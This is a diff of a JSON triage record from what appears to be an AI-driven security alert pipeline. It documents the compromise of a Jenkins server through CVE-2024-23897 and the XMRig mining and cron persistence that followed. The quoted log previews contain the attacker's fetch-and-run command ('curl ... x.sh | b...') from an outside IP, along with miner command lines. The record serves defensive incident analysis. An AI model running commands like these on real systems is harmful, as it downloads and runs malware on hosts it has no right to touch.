@@ -38,53 +38,167 @@
   "ticket": {
     "ticket_id": "TKT-20261006-011826",
     "alert_ids": [
-      "ALR-20261006-011826"
+      "ALR-20261006-011826",
+      "ALR-20261006-011825"
     ],
-    "title": "Triaje automático sin conclusión: Conexión a IP en lista de bloqueo de TI",
-    "verdict": "needs_more_info",
-    "confidence": 0.0,
-    "severity": "high",
-    "severity_rationale": "No calculada: el agente no terminó; se conserva la severidad de la regla.",
+    "title": "Compromiso de JENKINS-DEV01 mediante RCE CVE-2024-23897 y minería XMRig",
+    "verdict": "true_positive",
+    "confidence": 1.0,
+    "severity": "critical",
+    "severity_rationale": "Regla high × JENKINS-DEV01 (Media) = high; +1 (Ejecución confirmada de malware, persistencia y C2 tras RCE en servidor expuesto) → critical",
     "affected": {
-      "users": [],
-      "hosts": [],
-      "business_services": [],
+      "users": [
+        "jenkins"
+      ],
+      "hosts": [
+        "JENKINS-DEV01"
+      ],
+      "business_services": [
+        "Integración continua"
+      ],
       "customers": []
     },
-    "summary": "El agente no produjo un ticket válido (límite de uso del proveedor agotado (429): Error code: 429). Requiere triaje manual.",
-    "evidence": [],
-    "enrichment": [],
+    "summary": "El servidor JENKINS-DEV01 fue comprometido desde la IP 45.148.10.121 mediante la explotación de la vulnerabilidad RCE CVE-2024-23897. El atacante ejecutó un script que instaló el minero Monero XMRig (/tmp/.x/kswapd0), configuró persistencia en cron y estableció conexiones de minería con 141.94.96.144:3333.",
+    "evidence": [
+      {
+        "source": "waf",
+        "event_id": "WAF-0074412",
+        "finding": "Petición POST a /cli?remoting=false desde 45.148.10.121 explotando CVE-2024-23897"
+      },
+      {
+        "source": "edr_events",
+        "event_id": "EDR-0123423",
+        "finding": "Ejecución de sh descargando e interpretando script remoto x.sh desde 141.94.96.144"
+      },
+      {
+        "source": "edr_events",
+        "event_id": "EDR-0123424",
+        "finding": "Ejecución de binario malicioso /tmp/.x/kswapd0 camuflado como hilo del kernel"
+      },
+      {
+        "source": "edr_events",
+        "event_id": "EDR-0123425",
+        "finding": "Creación de persistencia mediante crontab ejecutando kswapd0 cada 5 minutos"
+      },
+      {
+        "source": "firewall",
+        "event_id": "FW-0025323",
+        "finding": "Tráfico TCP puerto 3333 permitido hacia IP de minería Monero 141.94.96.144"
+      }
+    ],
+    "enrichment": [
+      {
+        "indicator": "141.94.96.144",
+        "type": "ip",
+        "source": "ti_feed",
+        "result": "IP maliciosa asociada a pool de minería XMRig"
+      },
+      {
+        "indicator": "45.148.10.121",
+        "type": "ip",
+        "source": "ti_feed",
+        "result": "IP sospechosa origen de escaneos y exploits Jenkins"
+      },
+      {
+        "indicator": "pool.supportxmr.com",
+        "type": "domain",
+        "source": "ti_feed",
+        "result": "Dominio malicioso de pool de minería Monero"
+      },
+      {
+        "indicator": "561c0d422068e204fbcaf5c3fbf6575d6cf6a9610dc530cabd18cafdbaeabf83",
+        "type": "sha256",
+        "source": "sandbox",
+        "result": "Binario malicioso XMRig CoinMiner"
+      }
+    ],
     "mitre": [
+      "T1190",
+      "T1059.004",
+      "T1053.003",
+      "T1036.004",
+      "T1496",
       "T1071"
     ],
-    "recommended_actions": [],
+    "recommended_actions": [
+      {
+        "action": "isolate_host",
+        "target": "JENKINS-DEV01",
+        "requires_approval": true,
+        "justification": "Aislar servidor comprometido para detener minería y evitar propagación lateral.",
+        "approvers": "N2 + responsable del servicio: Director de Tecnología (Integración continua)"
+      },
+      {
+        "action": "block_ioc",
+        "target": "141.94.96.144",
+        "requires_approval": false,
+        "justification": "Bloquear IP C2 / pool de minería en el NGFW."
+      },
+      {
+        "action": "block_ioc",
+        "target": "45.148.10.121",
+        "requires_approval": false,
+        "justification": "Bloquear IP atacante en WAF / NGFW."
+      },
+      {
+        "action": "block_ioc",
+        "target": "pool.supportxmr.com",
+        "requires_approval": false,
+        "justification": "Bloquear dominio de pool de minería en DNS/proxy."
+      },
+      {
+        "action": "patch",
+        "target": "JENKINS-DEV01",
+        "requires_approval": true,
+        "justification": "Aplicar parche para CVE-2024-23897 y corregir la exposición indebida a Internet."
+      },
+      {
+        "action": "block_ioc",
+        "target": "561c0d422068e204fbcaf5c3fbf6575d6cf6a9610dc530cabd18cafdbaeabf83",
+        "requires_approval": false,
+        "approvers": "",
+        "justification": "Indicador malicioso según sandbox"
+      },
+      {
+        "action": "notify",
+        "target": "Responsable SOC",
+        "requires_approval": false,
+        "approvers": "",
+        "justification": "SLA de severidad critical (apartado 3)"
+      },
+      {
+        "action": "notify",
+        "target": "CISO",
+        "requires_approval": false,
+        "approvers": "",
+        "justification": "SLA de severidad critical (apartado 3)"
+      }
+    ],
     "escalation": {
       "escalate": true,
-      "to": "N1 humano",
-      "reason": "límite de uso del proveedor agotado (429): Error code: 429"
+      "to": "N2 de guardia por teléfono",
+      "reason": "True positive de severidad Crítica por RCE confirmado, persistencia y minería en JENKINS-DEV01."
     },
     "open_questions": [
-      "límite de uso del proveedor agotado (429): Error code: 429"
+      "¿Ha existido movimiento lateral a otros activos de la red DEV o interna desde JENKINS-DEV01?",
+      "¿Se han visto comprometidos secretos o credenciales (tokens CI/CD, SSH) almacenados en Jenkins?"
+    ],
+    "ajustes_politica": [
+      "isolate_host JENKINS-DEV01: requiere aprobación de N2 + responsable del servicio: Director de Tecnología (Integración continua)",
+      "Añadido block_ioc 561c0d422068e204fbcaf5c3fbf6575d6cf6a9610dc530cabd18cafdbaeabf83: malicioso según sandbox",
+      "Añadida notificación a Responsable SOC (SLA critical, apartado 3)",
+      "Añadida notificación a CISO (SLA critical, apartado 3)"
     ],
     "executed_actions": [],
-    "triage_seconds": 31.3
+    "triage_seconds": 32.5
   },
   "traza": [
-    {
-      "tool": "consultar_alerta",
-      "args": {
-        "alert_id": "ALR-20261006-011826"
-      },
-      "ms": 1,
-      "chars": 697,
-      "error": null,
-      "preview": "{\"alert_id\": \"ALR-20261006-011826\", \"created_at\": \"2026-10-06T01:18:09.000Z\", \"source_product\": \"NGFW\", \"rule_id\": \"UC-NET-002\", \"rule_name\": \"Conexión a IP en lista de bloqueo de TI\", \"severity\": \"high\", \"status\": \"new\", \"mitre\": {\"tactic\": \"Command and Control\", \"technique_id\": \"T1071\", \"technique"
-    },
     {
       "tool": "consultar_activo",
       "args": {
         "hostname_o_ip": "JENKINS-DEV01"
       },
+      "origen": "auto",
       "ms": 2,
       "chars": 751,
       "error": null,
@@ -95,59 +209,19 @@
       "args": {
         "indicador": "141.94.96.144"
       },
-      "ms": 4,
+      "origen": "auto",
+      "ms": 1,
       "chars": 514,
       "error": null,
       "preview": "{\"indicator\": \"141.94.96.144\", \"tip\": {\"indicator_type\": \"ip\", \"value\": \"141.94.96.144\", \"reputation\": \"malicious\", \"confidence\": 70, \"malware_family\": \"XMRig\", \"tags\": \"miner\", \"first_seen\": \"2026-09-20\", \"last_seen\": \"2026-10-15\", \"source\": \"Tarvia TIP (alimentado con feeds públicos)\", \"note\": \"\"}"
-    },
-    {
-      "tool": "buscar_cambios",
-      "args": {
-        "texto": "JENKINS-DEV01"
-      },
-      "ms": 4,
-      "chars": 2,
-      "error": null,
-      "preview": "[]"
-    },
-    {
-      "tool": "buscar_alertas_relacionadas",
-      "args": {
-        "texto": "JENKINS-DEV01",
-        "desde": "2026-10-05T00:00:00Z",
-        "hasta": "2026-10-07T00:00:00Z"
-      },
-      "ms": 45,
-      "chars": 922,
-      "error": null,
-      "preview": "{\"total_coincidencias\": 2, \"items\": [{\"alert_id\": \"ALR-20261006-011826\", \"created_at\": \"2026-10-06T01:18:09.000Z\", \"rule_id\": \"UC-NET-002\", \"rule_name\": \"Conexión a IP en lista de bloqueo de TI\", \"severity\": \"high\", \"entities\": {\"hosts\": [{\"hostname\": \"JENKINS-DEV01\", \"ip\": \"10.60.1.10\"}], \"ips\": [\""
-    },
-    {
-      "tool": "consultar_alerta",
-      "args": {
-        "alert_id": "ALR-20261006-011825"
-      },
-      "ms": 3,
-      "chars": 1085,
-      "error": null,
-      "preview": "{\"alert_id\": \"ALR-20261006-011825\", \"created_at\": \"2026-10-06T01:35:20.000Z\", \"source_product\": \"EDR\", \"rule_id\": \"UC-EDR-006\", \"rule_name\": \"Comportamiento de minería de criptomonedas\", \"severity\": \"high\", \"status\": \"new\", \"mitre\": {\"tactic\": \"Impact\", \"technique_id\": \"T1496\", \"technique\": \"Resourc"
-    },
-    {
-      "tool": "consultar_sandbox",
-      "args": {
-        "sha256": "561c0d422068e204fbcaf5c3fbf6575d6cf6a9610dc530cabd18cafdbaeabf83"
-      },
-      "ms": 4,
-      "chars": 545,
-      "error": null,
-      "preview": "{\"sha256\": \"561c0d422068e204fbcaf5c3fbf6575d6cf6a9610dc530cabd18cafdbaeabf83\", \"md5\": \"91e38186a1bbbad7c81a527d4f0636d6\", \"file_name\": \"kswapd0\", \"verdict\": \"malicious\", \"score\": 90, \"malware_family\": \"XMRig (CoinMiner)\", \"behaviors\": [\"ELF x86-64\", \"Argumentos stratum+tcp\", \"Se renombra como hilo d"
     },
     {
       "tool": "consultar_inteligencia",
       "args": {
         "indicador": "45.148.10.121"
       },
-      "ms": 4,
+      "origen": "auto",
+      "ms": 1,
       "chars": 566,
       "error": null,
       "preview": "{\"indicator\": \"45.148.10.121\", \"tip\": {\"indicator_type\": \"ip\", \"value\": \"45.148.10.121\", \"reputation\": \"suspicious\", \"confidence\": 55, \"malware_family\": \"\", \"tags\": \"scanner,exploit\", \"first_seen\": \"2026-09-20\", \"last_seen\": \"2026-10-15\", \"source\": \"Tarvia TIP (alimentado con feeds públicos)\", \"note"
@@ -157,31 +231,170 @@
       "args": {
         "indicador": "pool.supportxmr.com"
       },
-      "ms": 4,
+      "origen": "auto",
+      "ms": 1,
       "chars": 330,
       "error": null,
       "preview": "{\"indicator\": \"pool.supportxmr.com\", \"tip\": {\"indicator_type\": \"domain\", \"value\": \"pool.supportxmr.com\", \"reputation\": \"malicious\", \"confidence\": 70, \"malware_family\": \"XMRig\", \"tags\": \"miner\", \"first_seen\": \"2026-09-20\", \"last_seen\": \"2026-10-15\", \"source\": \"Tarvia TIP (alimentado con feeds público"
     },
     {
+      "tool": "consultar_inteligencia",
+      "args": {
+        "indicador": "561c0d422068e204fbcaf5c3fbf6575d6cf6a9610dc530cabd18cafdbaeabf83"
+      },
+      "origen": "auto",
+      "ms": 1,
+      "chars": 107,
+      "error": null,
+      "preview": "{\"indicator\": \"561c0d422068e204fbcaf5c3fbf6575d6cf6a9610dc530cabd18cafdbaeabf83\", \"tip\": null, \"geo\": null}"
+    },
+    {
+      "tool": "consultar_sandbox",
+      "args": {
+        "sha256": "561c0d422068e204fbcaf5c3fbf6575d6cf6a9610dc530cabd18cafdbaeabf83"
+      },
+      "origen": "auto",
+      "ms": 1,
+      "chars": 545,
+      "error": null,
+      "preview": "{\"sha256\": \"561c0d422068e204fbcaf5c3fbf6575d6cf6a9610dc530cabd18cafdbaeabf83\", \"md5\": \"91e38186a1bbbad7c81a527d4f0636d6\", \"file_name\": \"kswapd0\", \"verdict\": \"malicious\", \"score\": 90, \"malware_family\": \"XMRig (CoinMiner)\", \"behaviors\": [\"ELF x86-64\", \"Argumentos stratum+tcp\", \"Se renombra como hilo d"
+    },
+    {
       "tool": "buscar_logs",
       "args": {
-        "fuente": "edr_events",
-        "texto": "JENKINS-DEV01",
+        "fuente": "firewall",
+        "texto": "FW-0025323",
         "desde": "",
         "hasta": ""
       },
-      "ms": 466,
-      "chars": 1431,
+      "origen": "auto",
+      "ms": 81,
+      "chars": 328,
       "error": null,
-      "preview": "{\"count\": 3, \"truncated\": false, \"items\": [{\"event_id\": \"EDR-0123423\", \"timestamp\": \"2026-10-06T01:14:00.000Z\", \"event_type\": \"process_start\", \"hostname\": \"JENKINS-DEV01\", \"user\": \"jenkins\", \"process_name\": \"sh\", \"process_path\": \"/bin/sh\", \"command_line\": \"sh -c curl -s http://141.94.96.144/x.sh | b"
+      "preview": "{\"count\": 1, \"truncated\": false, \"items\": [{\"event_id\": \"FW-0025323\", \"timestamp\": \"2026-10-06T01:16:00.000Z\", \"src_ip\": \"10.60.1.10\", \"src_port\": \"44210\", \"dst_ip\": \"141.94.96.144\", \"dst_port\": \"3333\", \"proto\": \"TCP\", \"action\": \"allow\", \"rule\": \"DEV-OUTBOUND-ANY\", \"bytes\": \"58000\", \"zone_src\": \"DEV"
+    },
+    {
+      "tool": "buscar_logs",
+      "args": {
+        "fuente": "waf",
+        "texto": "WAF-0074412",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "auto",
+      "ms": 251,
+      "chars": 418,
+      "error": null,
+      "preview": "{\"count\": 1, \"truncated\": false, \"items\": [{\"event_id\": \"WAF-0074412\", \"timestamp\": \"2026-10-06T01:12:00.000Z\", \"src_ip\": \"45.148.10.121\", \"country\": \"NL\", \"method\": \"POST\", \"host\": \"jenkins-dev.tarvia.example\", \"uri\": \"/cli?remoting=false\", \"status\": 200, \"rule_id\": \"\", \"rule_msg\": \"(sin regla: hos"
+    },
+    {
+      "tool": "buscar_logs",
+      "args": {
+        "fuente": "edr_events",
+        "texto": "EDR-0123423",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "auto",
+      "ms": 491,
+      "chars": 424,
+      "error": null,
+      "preview": "{\"count\": 1, \"truncated\": false, \"items\": [{\"event_id\": \"EDR-0123423\", \"timestamp\": \"2026-10-06T01:14:00.000Z\", \"event_type\": \"process_start\", \"hostname\": \"JENKINS-DEV01\", \"user\": \"jenkins\", \"process_name\": \"sh\", \"process_path\": \"/bin/sh\", \"command_line\": \"sh -c curl -s http://141.94.96.144/x.sh | b"
+    },
+    {
+      "tool": "buscar_logs",
+      "args": {
+        "fuente": "edr_events",
+        "texto": "EDR-0123424",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "auto",
+      "ms": 481,
+      "chars": 649,
+      "error": null,
+      "preview": "{\"count\": 1, \"truncated\": false, \"items\": [{\"event_id\": \"EDR-0123424\", \"timestamp\": \"2026-10-06T01:15:00.000Z\", \"event_type\": \"process_start\", \"hostname\": \"JENKINS-DEV01\", \"user\": \"jenkins\", \"process_name\": \"kswapd0\", \"process_path\": \"/tmp/.x/kswapd0\", \"command_line\": \"/tmp/.x/kswapd0 -o pool.suppor"
+    },
+    {
+      "tool": "buscar_logs",
+      "args": {
+        "fuente": "edr_events",
+        "texto": "EDR-0123425",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "auto",
+      "ms": 494,
+      "chars": 444,
+      "error": null,
+      "preview": "{\"count\": 1, \"truncated\": false, \"items\": [{\"event_id\": \"EDR-0123425\", \"timestamp\": \"2026-10-06T01:15:20.000Z\", \"event_type\": \"registry_set\", \"hostname\": \"JENKINS-DEV01\", \"user\": \"jenkins\", \"process_name\": \"crontab\", \"process_path\": \"/usr/bin/crontab\", \"command_line\": \"\", \"parent_name\": \"\", \"pid\": 3"
+    },
+    {
+      "tool": "buscar_alertas_relacionadas",
+      "args": {
+        "texto": "JENKINS-DEV01",
+        "desde": "2026-10-05T01:18:09Z",
+        "hasta": "2026-10-07T01:18:09Z"
+      },
+      "origen": "auto",
+      "ms": 36,
+      "chars": 922,
+      "error": null,
+      "preview": "{\"total_coincidencias\": 2, \"items\": [{\"alert_id\": \"ALR-20261006-011826\", \"created_at\": \"2026-10-06T01:18:09.000Z\", \"rule_id\": \"UC-NET-002\", \"rule_name\": \"Conexión a IP en lista de bloqueo de TI\", \"severity\": \"high\", \"entities\": {\"hosts\": [{\"hostname\": \"JENKINS-DEV01\", \"ip\": \"10.60.1.10\"}], \"ips\": [\""
+    },
+    {
+      "tool": "buscar_alertas_relacionadas",
+      "args": {
+        "texto": "141.94.96.144",
+        "desde": "2026-10-05T01:18:09Z",
+        "hasta": "2026-10-07T01:18:09Z"
+      },
+      "origen": "auto",
+      "ms": 36,
+      "chars": 922,
+      "error": null,
+      "preview": "{\"total_coincidencias\": 2, \"items\": [{\"alert_id\": \"ALR-20261006-011826\", \"created_at\": \"2026-10-06T01:18:09.000Z\", \"rule_id\": \"UC-NET-002\", \"rule_name\": \"Conexión a IP en lista de bloqueo de TI\", \"severity\": \"high\", \"entities\": {\"hosts\": [{\"hostname\": \"JENKINS-DEV01\", \"ip\": \"10.60.1.10\"}], \"ips\": [\""
+    },
+    {
+      "tool": "buscar_alertas_relacionadas",
+      "args": {
+        "texto": "45.148.10.121",
+        "desde": "2026-10-05T01:18:09Z",
+        "hasta": "2026-10-07T01:18:09Z"
+      },
+      "origen": "auto",
+      "ms": 36,
+      "chars": 606,
+      "error": null,
+      "preview": "{\"total_coincidencias\": 1, \"items\": [{\"alert_id\": \"ALR-20261006-011825\", \"created_at\": \"2026-10-06T01:35:20.000Z\", \"rule_id\": \"UC-EDR-006\", \"rule_name\": \"Comportamiento de minería de criptomonedas\", \"severity\": \"high\", \"entities\": {\"hosts\": [{\"hostname\": \"JENKINS-DEV01\", \"ip\": \"10.60.1.10\"}], \"files"
+    },
+    {
+      "tool": "buscar_cambios",
+      "args": {
+        "texto": "JENKINS-DEV01"
+      },
+      "origen": "auto",
+      "ms": 2,
+      "chars": 2,
+      "error": null,
+      "preview": "[]"
     }
   ],
   "razonamiento": [],
   "uso": {
-    "input_tokens": 24114,
-    "output_tokens": 390,
-    "llamadas_modelo": 2
+    "input_tokens": 10496,
+    "output_tokens": 1274,
+    "llamadas_modelo": 1
   },
   "modelo": "gemini/gemini-3.5-flash",
-  "triado_en": "2026-11-07T15:46:05.266347+00:00"
+  "triado_en": "2026-11-07T18:16:29.274546+00:00",
+  "firma": null,
+  "heredado_de": null,
+  "entrada_severidad": {
+    "activo_mas_critico": "JENKINS-DEV01",
+    "criticidad": "Media",
+    "ajuste": "+1",
+    "motivo_ajuste": "Ejecución confirmada de malware, persistencia y C2 tras RCE en servidor expuesto",
+    "patron_generalizable": false
+  }
 }
